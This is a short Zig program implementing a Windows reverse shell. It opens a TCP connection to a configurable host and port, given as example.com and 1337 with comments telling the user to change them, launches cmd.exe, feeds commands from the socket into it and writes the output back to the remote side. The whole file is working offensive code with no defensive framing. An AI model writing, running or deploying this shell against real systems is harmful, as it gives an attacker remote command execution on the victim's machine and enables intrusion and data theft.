const std = @import("std");

// NOTE: change the ip or hostname
const TARGET_HOSTNAME = "example.com";
// NOTE: change the port
const TARGET_PORT = 1337;

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    const address_list = try std.net.getAddressList(allocator, TARGET_HOSTNAME, TARGET_PORT);
    defer address_list.deinit();
    const socket = try std.net.tcpConnectToAddress(address_list.addrs[0]);
    defer socket.close();

    var process = std.process.Child.init(&[_][]const u8{"cmd.exe"}, allocator);
    process.stdin_behavior = .Pipe;
    process.stdout_behavior = .Pipe;
    process.stderr_behavior = .Pipe;
    try process.spawn();
    defer _ = process.kill() catch {};

    var buffer: [4096]u8 = undefined;

    while (true) {
        // Read command from socket
        const bytes_read = socket.read(&buffer) catch break;
        if (bytes_read == 0) break;

        // Send command to process
        _ = process.stdin.?.write(buffer[0..bytes_read]) catch break;

        // Wait for execution
        std.time.sleep(300 * std.time.ns_per_ms);

        // Read output once with reasonable timeout
        if (process.stdout.?.read(&buffer)) |output_len| {
            if (output_len > 0) {
                _ = socket.write(buffer[0..output_len]) catch break;
            }
        } else |_| {
            // If stdout fails, try stderr
            if (process.stderr.?.read(&buffer)) |error_len| {
                if (error_len > 0) {
                    _ = socket.write(buffer[0..error_len]) catch break;
                }
            } else |_| {}
        }
    }
}
